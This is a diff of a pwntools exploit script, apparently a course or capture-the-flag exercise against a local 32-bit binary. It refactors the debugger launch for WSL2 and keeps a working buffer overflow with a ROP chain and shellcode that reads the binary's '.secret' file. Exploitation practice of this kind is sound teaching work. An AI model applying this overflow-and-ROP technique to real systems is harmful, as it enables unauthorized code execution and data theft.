@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 from pwn import *
 
-context.arch = 'i686'
+context.arch = "i686"
+
+file_binary = "10101_YAKOBCHUK_Dmytro"
 
 # FOR LINUX
 # env = {'LD_PRELOAD': 'libc.so.6', 'LD_ASLR': 'off'}
@@ -9,17 +11,31 @@ context.arch = 'i686'
 # pause()
 
 # FOR WSL2
-env = {'LD_PRELOAD': 'libc.so.6', 'LD_ASLR': 'off'}
-r = process(['setarch', '-R', './10101_YAKOBCHUK_Dmytro'], env = env)
-debug = True
-if debug == True:
-    pid = util.proc.pidof(r)[0]
-    cmd = f"cmd.exe /c start wt -p 'PowerShell' -d . wsl -e bash -c 'gdb -p {pid}\; exec $BASH'"
-    os.system(cmd)
-    util.proc.wait_for_debugger(pid)
+def run_exploit(debug, file_breakpoints):
+    env = {"LD_PRELOAD": "libc.so.6", "LD_ASLR": "off"}
+    p = process(["setarch", "-R", f"./{file_binary}"], env = env)
+    if debug == True:
+        pid = util.proc.pidof(p)[0]
+
+        gdb = f"gdb -q -p {pid}"
+        if file_breakpoints:
+            gdb += f" -x {file_breakpoints}"
+            print(f"Use breakpoints from {file_breakpoints}")
+
+        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
+        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
+        cmd = f"cmd.exe /c start {new_tab} {wsl}"
+        os.system(cmd)
+        util.proc.wait_for_debugger(pid)
+    return p
+
+
+file_breakpoints = "breaks32.gdb"
+r = run_exploit(True, file_breakpoints)
 
 sc = asm(shellcraft.cat('10101_YAKOBCHUK_Dmytro.secret') + shellcraft.echo('\n') + shellcraft.exit(13))
 
+# GADGETS
 rnop = p32(0x08049d20)  # ret
 peax = p32(0x080b0cda)  # pop eax ; ret
 peaxedxebx = p32(0x08058958)  # pop eax ; pop edx ; pop ebx ; ret
@@ -28,7 +44,8 @@ syscall = p32(0x08071c50)  # int 0x80 ; ret
 
 rwx = p32(0x08048000)
 
-buf = b'A' * 898
+overflow = 898
+buf = b'A' * overflow
 buf += p32(1337)
 buf += rnop * 500
 
@@ -55,7 +72,7 @@ buf += syscall
 # jump shellcode
 buf += rwx
 
-buf = buf.ljust(3596 + 898 + 4, b'B')
+buf = buf.ljust(4 * overflow + 4 + overflow + 4, b'B')
 buf += p32(0xffffd000)
 
 # pause()
